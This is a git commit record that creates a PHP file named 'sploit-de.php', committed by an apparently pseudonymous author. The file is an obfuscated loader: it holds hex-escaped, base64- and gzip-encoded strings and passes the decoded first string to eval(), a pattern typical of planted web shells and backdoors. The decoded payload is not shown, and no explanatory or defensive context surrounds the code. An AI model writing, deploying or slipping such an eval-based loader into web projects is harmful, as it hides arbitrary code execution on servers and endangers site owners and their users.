897965f767f41084b325d3f44b78ae68469b7579
thboskuhhhh <danangaceng63@gmail.com>
2025-06-02 18:52:24 +0700

    Create sploit-de.php

---
+++ sploit-de.php
@@ -0,0 +1,6 @@
+ <?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "f6\x438XQ6JXdM\x61g874NPx3VDw\x41zsTY2KR3fdPhUiRm3XhlVOfl3fplXGvh1Th8\x2buYuLrj\x41XVdmUPOQsezzfFNv\x62zJe/nM\x412Ew/EDwO\x42wJe/nL\x41GFw/0\x43wS\x42wJe/nK\x41WFw/k\x43wW\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
